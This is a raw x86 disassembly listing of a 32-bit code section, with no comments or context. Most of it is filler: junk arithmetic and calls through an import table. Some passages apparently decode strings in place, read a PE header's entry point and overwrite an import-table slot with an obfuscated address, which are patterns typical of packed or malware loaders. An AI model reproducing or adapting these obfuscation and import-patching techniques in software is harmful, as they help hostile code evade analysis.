  4d0795:	sbb    DWORD PTR [esi+0x8],0xffffffc9
  4d0799:	mov    edi,0x0
  4d079e:	push   edi
  4d079f:	call   0x4d0770
  4d07a4:	add    esp,0x4
  4d07a7:	push   esi
  4d07a8:	push   eax
  4d07a9:	push   eax
  4d07aa:	push   DWORD PTR [esi+0x54]
  4d07ad:	push   eax
  4d07ae:	call   0x4d0fa8
  4d07b3:	add    esp,0x10
  4d07b6:	pop    esi
  4d07b7:	mov    ecx,0x0
  4d07bc:	push   ecx
  4d07bd:	call   0x4d12f4
  4d07c2:	add    esp,0x4
  4d07c5:	add    esp,0x3c
  4d07c8:	pop    ebp
  4d07c9:	ret    
  4d07ca:	add    BYTE PTR [eax],al
  4d07cc:	pop    edi
  4d07cd:	call   DWORD PTR ds:0x4d2020
  4d07d3:	call   edi
  4d07d5:	add    BYTE PTR [eax],al
  4d07d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07dd:	sub    esp,0x38
  4d07e0:	lea    ebx,[edi+0x68]
  4d07e3:	add    edi,DWORD PTR [ebp-0x18]
  4d07e6:	push   ebx
  4d07e7:	push   DWORD PTR [ebx+0xb8]
  4d07ed:	push   DWORD PTR [ebx+0x108]
  4d07f3:	push   esi
  4d07f4:	call   0x4d0d5c
  4d07f9:	add    esp,0xc
  4d07fc:	pop    ebx
  4d07fd:	mov    edx,0xfffffff4
  4d0802:	push   edx
  4d0803:	call   0x4d11e8
  4d0808:	add    esp,0x4
  4d080b:	call   0x4d0f58
  4d0810:	add    esp,0x4
  4d0813:	add    esp,0x38
  4d0816:	pop    ebp
  4d0817:	ret    
  4d0818:	mov    edi,edi
  4d081a:	push   ebp
  4d081b:	mov    ebp,esp
  4d081d:	sub    esp,0x44
  4d0820:	lea    edx,[ebx+0x78]
  4d0823:	xor    DWORD PTR [edx-0x90],esi
  4d0829:	push   edx
  4d082a:	push   DWORD PTR [edx+0xa4]
  4d0830:	push   DWORD PTR [edx+0x19c]
  4d0836:	push   DWORD PTR [edx+0x78]
  4d0839:	call   0x4d0bcc
  4d083e:	add    esp,0xc
  4d0841:	pop    edx
  4d0842:	push   edx
  4d0843:	mov    edi,0x0
  4d0848:	push   edi
  4d0849:	call   0x4d13b0
  4d084e:	add    esp,0x4
  4d0851:	pop    edx
  4d0852:	push   edx
  4d0853:	mov    eax,0xfffffff4
  4d0858:	push   eax
  4d0859:	call   0x4d11e8
  4d085e:	add    esp,0x4
  4d0861:	pop    edx
  4d0862:	add    esp,0x44
  4d0865:	pop    ebp
  4d0866:	ret    
  4d0867:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d086d:	sub    esp,0x1c
  4d0870:	lea    edi,ds:0x4d3014
  4d0876:	and    eax,ecx
  4d0878:	push   edi
  4d0879:	mov    edi,0xfffffff4
  4d087e:	push   edi
  4d087f:	call   0x4d11e8
  4d0884:	add    esp,0x4
  4d0887:	pop    edi
  4d0888:	push   edi
  4d0889:	push   ecx
  4d088a:	push   DWORD PTR [edi+0x88]
  4d0890:	push   esi
  4d0891:	push   DWORD PTR [edi+0x128]
  4d0897:	call   0x4d0db0
  4d089c:	add    esp,0x10
  4d089f:	pop    edi
  4d08a0:	push   edi
  4d08a1:	call   0x4d150c
  4d08a6:	add    esp,0x4
  4d08a9:	pop    edi
  4d08aa:	add    esp,0x1c
  4d08ad:	pop    ebp
  4d08ae:	ret    
  4d08af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08b5:	sub    esp,0x38
  4d08b8:	lea    edi,[ebx-0x188]
  4d08be:	cmp    edi,0x20c1
  4d08c4:	jbe    0x4d08b3
  4d08c6:	push   edi
  4d08c7:	call   0x4d0f58
  4d08cc:	add    esp,0x4
  4d08cf:	pop    edi
  4d08d0:	push   edi
  4d08d1:	push   DWORD PTR [edi+0x4c]
  4d08d4:	push   ebx
  4d08d5:	call   0x4d13c8
  4d08da:	add    esp,0x8
  4d08dd:	pop    edi
  4d08de:	push   edi
  4d08df:	mov    eax,0xfffffff4
  4d08e4:	push   eax
  4d08e5:	call   0x4d11e8
  4d08ea:	add    esp,0x4
  4d08ed:	pop    edi
  4d08ee:	add    esp,0x38
  4d08f1:	pop    ebp
  4d08f2:	ret    
  4d08f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08f9:	sub    esp,0x44
  4d08fc:	lea    ebx,ds:0x4d3190
  4d0902:	xor    eax,DWORD PTR [ebx-0x140]
  4d0908:	mov    esi,0x0
  4d090d:	push   esi
  4d090e:	call   0x4d12f4
  4d0913:	add    esp,0x4
  4d0916:	push   ebx
  4d0917:	push   ecx
  4d0918:	push   DWORD PTR [ebx+0xe4]
  4d091e:	push   DWORD PTR [ebx+0x130]
  4d0924:	call   0x4d09ec
  4d0929:	add    esp,0xc
  4d092c:	pop    ebx
  4d092d:	push   0x0
  4d092f:	call   0x4d1300
  4d0934:	add    esp,0x4
  4d0937:	add    esp,0x44
  4d093a:	pop    ebp
  4d093b:	ret    
  4d093c:	pop    edi
  4d093d:	call   DWORD PTR ds:0x4d2074
  4d0943:	call   edi
  4d0945:	add    BYTE PTR [eax],al
  4d0947:	add    BYTE PTR [edi-0x1],bl
  4d094a:	adc    eax,0x4d2068
  4d094f:	call   edi
  4d0951:	add    BYTE PTR [eax],al
  4d0953:	add    BYTE PTR [edi-0x1],bl
  4d0956:	adc    eax,0x4d2064
  4d095b:	call   edi
  4d095d:	add    BYTE PTR [eax],al
  4d095f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0965:	sub    esp,0x28
  4d0968:	lea    esi,ds:0x4d3194
  4d096e:	sbb    DWORD PTR [ebp-0x28],0xffffffef
  4d0972:	mov    edx,0x0
  4d0977:	push   edx
  4d0978:	call   0x4d093c
  4d097d:	add    esp,0x4
  4d0980:	push   esi
  4d0981:	push   DWORD PTR [esi+0xc0]
  4d0987:	push   DWORD PTR [esi+0xe8]
  4d098d:	call   0x4d14bc
  4d0992:	add    esp,0x8
  4d0995:	pop    esi
  4d0996:	call   0x4d0f58
  4d099b:	add    esp,0x4
  4d099e:	add    esp,0x28
  4d09a1:	pop    ebp
  4d09a2:	ret    
  4d09a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09a9:	sub    esp,0x50
  4d09ac:	mov    esi,0x4d31b4
  4d09b1:	xor    edx,0xffffacc1
  4d09b7:	push   0x0
  4d09b9:	call   0x4d093c
  4d09be:	add    esp,0x4
  4d09c1:	push   esi
  4d09c2:	push   DWORD PTR [esi+0x20]
  4d09c5:	push   DWORD PTR [esi+0xa8]
  4d09cb:	push   DWORD PTR [esi+0x1fc]
  4d09d1:	call   0x4d1358
  4d09d6:	add    esp,0xc
  4d09d9:	pop    esi
  4d09da:	push   0x0
  4d09dc:	call   0x4d0770
  4d09e1:	add    esp,0x4
  4d09e4:	add    esp,0x50
  4d09e7:	pop    ebp
  4d09e8:	ret    
  4d09e9:	add    BYTE PTR [eax],al
  4d09eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09f1:	sub    esp,0x28
  4d09f4:	mov    edx,0x4d3148
  4d09f9:	cmp    edx,0x3c00
  4d09ff:	jb     0x4d09ef
  4d0a01:	push   edx
  4d0a02:	push   edi
  4d0a03:	push   DWORD PTR [edx+0xb0]
  4d0a09:	push   DWORD PTR [edx+0x168]
  4d0a0f:	call   0x4d0f0c
  4d0a14:	add    esp,0xc
  4d0a17:	pop    edx
  4d0a18:	push   edx
  4d0a19:	push   0x0
  4d0a1b:	call   0x4d118c
  4d0a20:	add    esp,0x4
  4d0a23:	pop    edx
  4d0a24:	push   edx
  4d0a25:	mov    esi,0x0
  4d0a2a:	push   esi
  4d0a2b:	call   0x4d128c
  4d0a30:	add    esp,0x4
  4d0a33:	pop    edx
  4d0a34:	add    esp,0x28
  4d0a37:	pop    ebp
  4d0a38:	ret    
  4d0a39:	add    BYTE PTR [eax],al
  4d0a3b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a41:	sub    esp,0x5c
  4d0a44:	lea    edi,ds:0x4d319c
  4d0a4a:	xor    DWORD PTR [edi+0x8],0xffffc2c8
  4d0a51:	push   edi
  4d0a52:	push   ecx
  4d0a53:	push   DWORD PTR [edi+0x108]
  4d0a59:	push   DWORD PTR [edi+0xb4]
  4d0a5f:	push   eax
  4d0a60:	call   0x4d106c
  4d0a65:	add    esp,0x10
  4d0a68:	pop    edi
  4d0a69:	push   edi
  4d0a6a:	mov    eax,0xfffffff4
  4d0a6f:	push   eax
  4d0a70:	call   0x4d11e8
  4d0a75:	add    esp,0x4
  4d0a78:	pop    edi
  4d0a79:	push   edi
  4d0a7a:	mov    ebx,0x0
  4d0a7f:	push   ebx
  4d0a80:	call   0x4d06ec
  4d0a85:	add    esp,0x4
  4d0a88:	pop    edi
  4d0a89:	add    esp,0x5c
  4d0a8c:	pop    ebp
  4d0a8d:	ret    
  4d0a8e:	add    BYTE PTR [eax],al
  4d0a90:	pop    edi
  4d0a91:	call   DWORD PTR ds:0x4d2058
  4d0a97:	call   edi
  4d0a99:	add    BYTE PTR [eax],al
  4d0a9b:	add    BYTE PTR [edi-0x1],bl
  4d0a9e:	adc    eax,0x4d20a0
  4d0aa3:	call   edi
  4d0aa5:	add    BYTE PTR [eax],al
  4d0aa7:	add    BYTE PTR [edi-0x1],bl
  4d0aaa:	adc    eax,0x4d205c
  4d0aaf:	call   edi
  4d0ab1:	add    BYTE PTR [eax],al
  4d0ab3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ab9:	sub    esp,0x54
  4d0abc:	mov    ecx,0x4d3198
  4d0ac1:	mov    ebx,DWORD PTR [ebp-0x24]
  4d0ac4:	push   ecx
  4d0ac5:	push   edx
  4d0ac6:	push   DWORD PTR [ecx+0x98]
  4d0acc:	push   DWORD PTR [ecx+0x1ec]
  4d0ad2:	push   DWORD PTR [ecx+0xc]
  4d0ad5:	call   0x4d0960
  4d0ada:	add    esp,0x10
  4d0add:	pop    ecx
  4d0ade:	push   ecx
  4d0adf:	push   0x0
  4d0ae1:	call   0x4d06ec
  4d0ae6:	add    esp,0x4
  4d0ae9:	pop    ecx
  4d0aea:	push   ecx
  4d0aeb:	push   0x0
  4d0aed:	call   0x4d12f4
  4d0af2:	add    esp,0x4
  4d0af5:	pop    ecx
  4d0af6:	add    esp,0x54
  4d0af9:	pop    ebp
  4d0afa:	ret    
  4d0afb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b01:	sub    esp,0x60
  4d0b04:	lea    ebx,[ecx+0x4c]
  4d0b07:	and    DWORD PTR [ebp-0x18],0xffffa923
  4d0b0e:	push   ebx
  4d0b0f:	push   edi
  4d0b10:	push   DWORD PTR [ebx+0x1d8]
  4d0b16:	push   DWORD PTR [ebx+0x94]
  4d0b1c:	push   eax
  4d0b1d:	call   0x4d1020
  4d0b22:	add    esp,0x10
  4d0b25:	pop    ebx
  4d0b26:	call   0x4d150c
  4d0b2b:	add    esp,0x4
  4d0b2e:	push   0x0
  4d0b30:	call   0x4d0c9c
  4d0b35:	add    esp,0x4
  4d0b38:	add    esp,0x60
  4d0b3b:	pop    ebp
  4d0b3c:	ret    
  4d0b3d:	add    BYTE PTR [eax],al
  4d0b3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b45:	sub    esp,0x20
  4d0b48:	lea    edi,[ebx+0x5c]
  4d0b4b:	adc    DWORD PTR [edi+0x3c],eax
  4d0b4e:	push   edi
  4d0b4f:	push   ecx
  4d0b50:	push   esi
  4d0b51:	push   edx
  4d0b52:	push   ebx
  4d0b53:	call   0x4d1408
  4d0b58:	add    esp,0x10
  4d0b5b:	pop    edi
  4d0b5c:	push   edi
  4d0b5d:	call   0x4d0f58
  4d0b62:	add    esp,0x4
  4d0b65:	pop    edi
  4d0b66:	push   edi
  4d0b67:	mov    edi,0x0
  4d0b6c:	push   edi
  4d0b6d:	call   0x4d12f4
  4d0b72:	add    esp,0x4
  4d0b75:	pop    edi
  4d0b76:	add    esp,0x20
  4d0b79:	pop    ebp
  4d0b7a:	ret    
  4d0b7b:	add    BYTE PTR [edi-0x1],bl
  4d0b7e:	adc    eax,0x4d2000
  4d0b83:	call   edi
  4d0b85:	add    BYTE PTR [eax],al
  4d0b87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b8d:	sub    esp,0x48
  4d0b90:	mov    ebx,0x4d31c8
  4d0b95:	mov    DWORD PTR [ebp-0x44],0x7c
  4d0b9c:	call   0x4d07cc
  4d0ba1:	add    esp,0x4
  4d0ba4:	push   ebx
  4d0ba5:	push   eax
  4d0ba6:	push   edi
  4d0ba7:	push   DWORD PTR [ebx+0x180]
  4d0bad:	push   DWORD PTR [ebx+0x160]
  4d0bb3:	call   0x4d0e78
  4d0bb8:	add    esp,0x10
  4d0bbb:	pop    ebx
  4d0bbc:	push   0x0
  4d0bbe:	call   0x4d128c
  4d0bc3:	add    esp,0x4
  4d0bc6:	add    esp,0x48
  4d0bc9:	pop    ebp
  4d0bca:	ret    
  4d0bcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd1:	sub    esp,0x60
  4d0bd4:	lea    esi,[edx-0x74]
  4d0bd7:	and    ecx,eax
  4d0bd9:	mov    eax,0xfffffff4
  4d0bde:	push   eax
  4d0bdf:	call   0x4d11e8
  4d0be4:	add    esp,0x4
  4d0be7:	push   esi
  4d0be8:	push   ecx
  4d0be9:	push   DWORD PTR [esi+0x1c4]
  4d0bef:	push   DWORD PTR [esi+0x15c]
  4d0bf5:	push   DWORD PTR [esi+0x134]
  4d0bfb:	call   0x4d0dfc
  4d0c00:	add    esp,0x10
  4d0c03:	pop    esi
  4d0c04:	push   0x0
  4d0c06:	call   0x4d06ec
  4d0c0b:	add    esp,0x4
  4d0c0e:	add    esp,0x60
  4d0c11:	pop    ebp
  4d0c12:	ret    
  4d0c13:	add    BYTE PTR [edi+0x2b],dl
  4d0c16:	call   DWORD PTR [edi+0x57]
  4d0c19:	push   edi
  4d0c1a:	push   edi
  4d0c1b:	call   0x4d07cc
  4d0c20:	sub    esp,0xfffffffc
  4d0c23:	call   0x4d0eb4
  4d0c28:	push   0x2
  4d0c2a:	xor    eax,eax
  4d0c2c:	dec    eax
  4d0c2d:	and    eax,0x4d3030
  4d0c32:	push   0x0
  4d0c34:	lea    ecx,[eax+0x6]
  4d0c37:	add    BYTE PTR [ecx],0x41
  4d0c3a:	push   eax
  4d0c3b:	call   0x4d0df0
  4d0c40:	pop    edi
  4d0c41:	pop    edi
  4d0c42:	pop    edi
  4d0c43:	lea    edi,[eax+0x3b]
  4d0c46:	mov    edi,DWORD PTR [edi]
  4d0c48:	lea    eax,[eax+edi*1]
  4d0c4b:	mov    eax,DWORD PTR [eax+0x28]
  4d0c4e:	pusha  
  4d0c4f:	mov    ah,0x45
  4d0c51:	sub    al,ah
  4d0c53:	ja     0x4d0704
  4d0c59:	popa   
  4d0c5a:	ret    
  4d0c5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c61:	sub    esp,0x24
  4d0c64:	lea    ebx,[edi+0x5c]
  4d0c67:	mov    edi,DWORD PTR [ebx-0x9c]
  4d0c6d:	push   0x0
  4d0c6f:	call   0x4d12f4
  4d0c74:	add    esp,0x4
  4d0c77:	push   ebx
  4d0c78:	push   DWORD PTR [ebx+0x170]
  4d0c7e:	push   DWORD PTR [ebx+0x140]
  4d0c84:	call   0x4d1198
  4d0c89:	add    esp,0x8
  4d0c8c:	pop    ebx
  4d0c8d:	call   0x4d150c
  4d0c92:	add    esp,0x4
  4d0c95:	add    esp,0x24
  4d0c98:	pop    ebp
  4d0c99:	ret    
  4d0c9a:	add    BYTE PTR [eax],al
  4d0c9c:	pop    edi
  4d0c9d:	call   DWORD PTR ds:0x4d2084
  4d0ca3:	call   edi
  4d0ca5:	add    BYTE PTR [eax],al
  4d0ca7:	add    BYTE PTR [edi-0x1],bl
  4d0caa:	adc    eax,0x4d2098
  4d0caf:	call   edi
  4d0cb1:	add    BYTE PTR [eax],al
  4d0cb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cb9:	sub    esp,0x2c
  4d0cbc:	lea    edi,[eax-0x48]
  4d0cbf:	sbb    edx,DWORD PTR [ebp-0xc]
  4d0cc2:	push   edi
  4d0cc3:	push   DWORD PTR [edi+0x4]
  4d0cc6:	push   edx
  4d0cc7:	push   DWORD PTR [edi+0x110]
  4d0ccd:	push   DWORD PTR [edi+0x168]
  4d0cd3:	call   0x4d0c5c
  4d0cd8:	add    esp,0x10
  4d0cdb:	pop    edi
  4d0cdc:	push   edi
  4d0cdd:	lea    esi,[edi-0x60]
  4d0ce0:	push   esi
  4d0ce1:	call   0x4d077c
  4d0ce6:	add    esp,0x4
  4d0ce9:	test   eax,eax
  4d0ceb:	jne    0x4d0cdd
  4d0ced:	pop    edi
  4d0cee:	push   edi
  4d0cef:	push   0xfffffff4
  4d0cf1:	call   0x4d11e8
  4d0cf6:	add    esp,0x4
  4d0cf9:	pop    edi
  4d0cfa:	add    esp,0x2c
  4d0cfd:	pop    ebp
  4d0cfe:	ret    
  4d0cff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d05:	sub    esp,0x4c
  4d0d08:	lea    edi,[ebx-0x8]
  4d0d0b:	mov    DWORD PTR [ebp-0x3c],0x2de0
  4d0d12:	push   edi
  4d0d13:	mov    eax,0x0
  4d0d18:	push   eax
  4d0d19:	call   0x4d0758
  4d0d1e:	add    esp,0x4
  4d0d21:	pop    edi
  4d0d22:	push   edi
  4d0d23:	push   ebx
  4d0d24:	push   DWORD PTR [edi+0x1c4]
  4d0d2a:	call   0x4d07d8
  4d0d2f:	add    esp,0x8
  4d0d32:	pop    edi
  4d0d33:	push   edi
  4d0d34:	lea    edi,[edi-0x100]
  4d0d3a:	push   edi
  4d0d3b:	call   0x4d077c
  4d0d40:	add    esp,0x4
  4d0d43:	test   eax,eax
  4d0d45:	jne    0x4d0d34
  4d0d47:	pop    edi
  4d0d48:	add    esp,0x4c
  4d0d4b:	pop    ebp
  4d0d4c:	ret    
  4d0d4d:	add    BYTE PTR [eax],al
  4d0d4f:	add    BYTE PTR [edi-0x1],bl
  4d0d52:	adc    eax,0x4d2080
  4d0d57:	call   edi
  4d0d59:	add    BYTE PTR [eax],al
  4d0d5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d61:	sub    esp,0x34
  4d0d64:	mov    edi,0x4d31f4
  4d0d69:	or     esi,DWORD PTR [edi-0x50]
  4d0d6c:	push   edi
  4d0d6d:	push   edx
  4d0d6e:	push   DWORD PTR [edi+0x28]
  4d0d71:	push   ebx
  4d0d72:	push   ebx
  4d0d73:	call   0x4d154c
  4d0d78:	add    esp,0x10
  4d0d7b:	pop    edi
  4d0d7c:	push   edi
  4d0d7d:	push   0x0
  4d0d7f:	call   0x4d06ec
  4d0d84:	add    esp,0x4
  4d0d87:	pop    edi
  4d0d88:	push   edi
  4d0d89:	lea    ecx,[edi-0x1f4]
  4d0d8f:	push   ecx
  4d0d90:	call   0x4d077c
  4d0d95:	add    esp,0x4
  4d0d98:	test   eax,eax
  4d0d9a:	jne    0x4d0d89
  4d0d9c:	pop    edi
  4d0d9d:	add    esp,0x34
  4d0da0:	pop    ebp
  4d0da1:	ret    
  4d0da2:	add    BYTE PTR [eax],al
  4d0da4:	pop    edi
  4d0da5:	call   DWORD PTR ds:0x4d2010
  4d0dab:	call   edi
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db5:	sub    esp,0x2c
  4d0db8:	mov    ebx,0x4d3178
  4d0dbd:	adc    DWORD PTR [ebx-0x18],eax
  4d0dc0:	push   ebx
  4d0dc1:	push   DWORD PTR [ebx+0x1b4]
  4d0dc7:	push   esi
  4d0dc8:	push   esi
  4d0dc9:	push   esi
  4d0dca:	call   0x4d0788
  4d0dcf:	add    esp,0x10
  4d0dd2:	pop    ebx
  4d0dd3:	mov    eax,0x0
  4d0dd8:	push   eax
  4d0dd9:	call   0x4d13b0
  4d0dde:	add    esp,0x4
  4d0de1:	push   0xfffffff4
  4d0de3:	call   0x4d11e8
  4d0de8:	add    esp,0x4
  4d0deb:	add    esp,0x2c
  4d0dee:	pop    ebp
  4d0def:	ret    
  4d0df0:	pop    edi
  4d0df1:	call   DWORD PTR ds:0x4d203c
  4d0df7:	call   edi
  4d0df9:	add    BYTE PTR [eax],al
  4d0dfb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e01:	sub    esp,0x54
  4d0e04:	lea    edi,ds:0x4d30d0
  4d0e0a:	sub    eax,ecx
  4d0e0c:	push   edi
  4d0e0d:	push   0x0
  4d0e0f:	call   0x4d13b0
  4d0e14:	add    esp,0x4
  4d0e17:	pop    edi
  4d0e18:	push   edi
  4d0e19:	push   DWORD PTR [edi+0x1e0]
  4d0e1f:	push   esi
  4d0e20:	call   0x4d0b88
  4d0e25:	add    esp,0x8
  4d0e28:	pop    edi
  4d0e29:	push   edi
  4d0e2a:	mov    ebx,0x0
  4d0e2f:	push   ebx
  4d0e30:	call   0x4d093c
  4d0e35:	add    esp,0x4
  4d0e38:	pop    edi
  4d0e39:	add    esp,0x54
  4d0e3c:	pop    ebp
  4d0e3d:	ret    
  4d0e3e:	add    BYTE PTR [eax],al
  4d0e40:	mov    edi,edi
  4d0e42:	push   ebp
  4d0e43:	mov    ebp,esp
  4d0e45:	sub    esp,0x60
  4d0e48:	lea    ebx,ds:0x4d30c0
  4d0e4e:	adc    esi,DWORD PTR [ebp-0x30]
  4d0e51:	push   ebx
  4d0e52:	push   esi
  4d0e53:	push   ecx
  4d0e54:	call   0x4d0868
  4d0e59:	add    esp,0x8
  4d0e5c:	pop    ebx
  4d0e5d:	call   0x4d07cc
  4d0e62:	add    esp,0x4
  4d0e65:	mov    edx,0x0
  4d0e6a:	push   edx
  4d0e6b:	call   0x4d118c
  4d0e70:	add    esp,0x4
  4d0e73:	add    esp,0x60
  4d0e76:	pop    ebp
  4d0e77:	ret    
  4d0e78:	mov    edi,edi
  4d0e7a:	push   ebp
  4d0e7b:	mov    ebp,esp
  4d0e7d:	sub    esp,0x54
  4d0e80:	lea    edi,[ebx-0x24]
  4d0e83:	sbb    eax,0x1
  4d0e86:	push   edi
  4d0e87:	push   esi
  4d0e88:	push   DWORD PTR [edi+0xc0]
  4d0e8e:	call   0x4d0f64
  4d0e93:	add    esp,0x8
  4d0e96:	pop    edi
  4d0e97:	push   edi
  4d0e98:	call   0x4d07cc
  4d0e9d:	add    esp,0x4
  4d0ea0:	pop    edi
  4d0ea1:	push   edi
  4d0ea2:	push   0x0
  4d0ea4:	call   0x4d0770
  4d0ea9:	add    esp,0x4
  4d0eac:	pop    edi
  4d0ead:	add    esp,0x54
  4d0eb0:	pop    ebp
  4d0eb1:	ret    
  4d0eb2:	add    BYTE PTR [eax],al
  4d0eb4:	pop    edi
  4d0eb5:	call   DWORD PTR ds:0x4d2040
  4d0ebb:	call   edi
  4d0ebd:	add    BYTE PTR [eax],al
  4d0ebf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ec5:	sub    esp,0x5c
  4d0ec8:	lea    ecx,[edi+0x114]
  4d0ece:	sbb    esi,DWORD PTR [ecx-0x38]
  4d0ed1:	push   ecx
  4d0ed2:	mov    esi,0x0
  4d0ed7:	push   esi
  4d0ed8:	call   0x4d1300
  4d0edd:	add    esp,0x4
  4d0ee0:	pop    ecx
  4d0ee1:	push   ecx
  4d0ee2:	push   edx
  4d0ee3:	push   edi
  4d0ee4:	push   edi
  4d0ee5:	call   0x4d0e40
  4d0eea:	add    esp,0xc
  4d0eed:	pop    ecx
  4d0eee:	push   ecx
  4d0eef:	push   0x0
  4d0ef1:	call   0x4d0758
  4d0ef6:	add    esp,0x4
  4d0ef9:	pop    ecx
  4d0efa:	add    esp,0x5c
  4d0efd:	pop    ebp
  4d0efe:	ret    
  4d0eff:	add    BYTE PTR [edi-0x1],bl
  4d0f02:	adc    eax,0x4d2060
  4d0f07:	call   edi
  4d0f09:	add    BYTE PTR [eax],al
  4d0f0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f11:	sub    esp,0x30
  4d0f14:	lea    ecx,ds:0x4d3048
  4d0f1a:	xor    esi,DWORD PTR [ebp-0x14]
  4d0f1d:	push   ecx
  4d0f1e:	push   esi
  4d0f1f:	push   eax
  4d0f20:	push   esi
  4d0f21:	push   DWORD PTR [ecx+0x1c8]
  4d0f27:	call   0x4d1518
  4d0f2c:	add    esp,0x10
  4d0f2f:	pop    ecx
  4d0f30:	push   ecx
  4d0f31:	lea    ebx,[ecx-0x48]
  4d0f34:	push   ebx
  4d0f35:	call   0x4d077c
  4d0f3a:	add    esp,0x4
  4d0f3d:	test   eax,eax
  4d0f3f:	jne    0x4d0f31
  4d0f41:	pop    ecx
  4d0f42:	push   ecx
  4d0f43:	mov    edx,0x0
  4d0f48:	push   edx
  4d0f49:	call   0x4d118c
  4d0f4e:	add    esp,0x4
  4d0f51:	pop    ecx
  4d0f52:	add    esp,0x30
  4d0f55:	pop    ebp
  4d0f56:	ret    
  4d0f57:	add    BYTE PTR [edi-0x1],bl
  4d0f5a:	adc    eax,0x4d2008
  4d0f5f:	call   edi
  4d0f61:	add    BYTE PTR [eax],al
  4d0f63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f69:	sub    esp,0x40
  4d0f6c:	lea    eax,ds:0x4d306c
  4d0f72:	sub    ebx,DWORD PTR [eax+0x124]
  4d0f78:	push   eax
  4d0f79:	mov    ecx,0x0
  4d0f7e:	push   ecx
  4d0f7f:	call   0x4d128c
  4d0f84:	add    esp,0x4
  4d0f87:	pop    eax
  4d0f88:	push   eax
  4d0f89:	push   DWORD PTR [eax+0x120]
  4d0f8f:	push   edi
  4d0f90:	call   0x4d0fe0
  4d0f95:	add    esp,0x8
  4d0f98:	pop    eax
  4d0f99:	push   eax
  4d0f9a:	call   0x4d150c
  4d0f9f:	add    esp,0x4
  4d0fa2:	pop    eax
  4d0fa3:	add    esp,0x40
  4d0fa6:	pop    ebp
  4d0fa7:	ret    
  4d0fa8:	mov    edi,edi
  4d0faa:	push   ebp
  4d0fab:	mov    ebp,esp
  4d0fad:	sub    esp,0x20
  4d0fb0:	lea    ebx,[esi-0x8]
  4d0fb3:	or     edi,DWORD PTR [ebx-0x60]
  4d0fb6:	call   0x4d07cc
  4d0fbb:	add    esp,0x4
  4d0fbe:	push   ebx
  4d0fbf:	push   esi
  4d0fc0:	push   eax
  4d0fc1:	push   ecx
  4d0fc2:	call   0x4d0d00
  4d0fc7:	add    esp,0xc
  4d0fca:	pop    ebx
  4d0fcb:	mov    eax,0x0
  4d0fd0:	push   eax
  4d0fd1:	call   0x4d12f4
  4d0fd6:	add    esp,0x4
  4d0fd9:	add    esp,0x20
  4d0fdc:	pop    ebp
  4d0fdd:	ret    
  4d0fde:	add    BYTE PTR [eax],al
  4d0fe0:	mov    edi,edi
  4d0fe2:	push   ebp
  4d0fe3:	mov    ebp,esp
  4d0fe5:	sub    esp,0x54
  4d0fe8:	lea    ebx,ds:0x4d3104
  4d0fee:	sbb    DWORD PTR [ebx+0xd8],0x53f2
  4d0ff8:	push   0x0
  4d0ffa:	call   0x4d093c
  4d0fff:	add    esp,0x4
  4d1002:	push   ebx
  4d1003:	push   DWORD PTR [ebx+0x20]
  4d1006:	push   eax
  4d1007:	push   edi
  4d1008:	call   0x4d0b40
  4d100d:	add    esp,0xc
  4d1010:	pop    ebx
  4d1011:	call   0x4d150c
  4d1016:	add    esp,0x4
  4d1019:	add    esp,0x54
  4d101c:	pop    ebp
  4d101d:	ret    
  4d101e:	add    BYTE PTR [eax],al
  4d1020:	mov    edi,edi
  4d1022:	push   ebp
  4d1023:	mov    ebp,esp
  4d1025:	sub    esp,0x60
  4d1028:	lea    eax,ds:0x4d30f0
  4d102e:	adc    esi,edi
  4d1030:	push   eax
  4d1031:	push   DWORD PTR [eax+0x140]
  4d1037:	push   esi
  4d1038:	push   edi
  4d1039:	push   ebx
  4d103a:	call   0x4d08f4
  4d103f:	add    esp,0x10
  4d1042:	pop    eax
  4d1043:	push   eax
  4d1044:	push   0xfffffff4
  4d1046:	call   0x4d11e8
  4d104b:	add    esp,0x4
  4d104e:	pop    eax
  4d104f:	push   eax
  4d1050:	push   0x0
  4d1052:	call   0x4d0758
  4d1057:	add    esp,0x4
  4d105a:	pop    eax
  4d105b:	add    esp,0x60
  4d105e:	pop    ebp
  4d105f:	ret    
  4d1060:	pop    edi
  4d1061:	call   DWORD PTR ds:0x4d200c
  4d1067:	call   edi
  4d1069:	add    BYTE PTR [eax],al
  4d106b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1071:	sub    esp,0x58
  4d1074:	sub    DWORD PTR [edi-0x124],0xffffffc3
  4d107b:	lea    eax,[edi-0x54]
  4d107e:	push   eax
  4d107f:	push   0x6ac
  4d1084:	mov    esi,0x6ac
  4d1089:	push   esi
  4d108a:	push   0x40001
  4d108f:	mov    esi,0x86298592
  4d1094:	push   DWORD PTR [esi+0x7a239a86]
  4d109a:	sub    DWORD PTR [esp],0x2
  4d109e:	mov    esi,0x4d203c
  4d10a3:	pop    DWORD PTR [esi]
  4d10a5:	call   0x4d0df0
  4d10aa:	add    esp,0x4
  4d10ad:	xchg   DWORD PTR [esp],eax
  4d10b0:	pop    DWORD PTR [eax-0x54]
  4d10b3:	mov    ecx,DWORD PTR [eax-0x54]
  4d10b6:	lea    ecx,[ecx]
  4d10b8:	sub    esi,esi
  4d10ba:	dec    esi
  4d10bb:	and    esi,0x4d0014
  4d10c1:	mov    ebx,0xd5d9a824
  4d10c6:	xor    edx,edx
  4d10c8:	xor    edi,edi
